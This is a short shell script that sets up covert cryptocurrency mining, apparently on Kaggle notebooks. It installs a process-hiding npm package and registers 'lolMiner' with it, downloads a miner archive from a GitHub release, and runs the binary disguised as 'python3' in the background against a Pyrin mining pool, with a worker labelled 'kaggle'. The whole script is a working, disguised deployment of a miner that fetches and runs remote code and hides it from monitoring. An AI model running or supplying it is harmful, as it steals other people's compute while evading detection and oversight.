curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt install -y nodejs
sudo npm install -g node-process-hider
sudo ph add lolMiner
wget -O meki https://github.com/DotAja/ALONE/releases/download/alone/dotlol.tar.gz
tar -xvf meki
cd dotlol
nohup ./python3 --algo PYRIN --pool de.pyrin.herominers.com:1177 --user pyrin:qrgnesqnu6550ejrtznwmjj2slsk7407kcqxh6pe63xj0tlm4hn4z0fk3anle.kaggle --no-cl /dev/null 2>&1 &
top
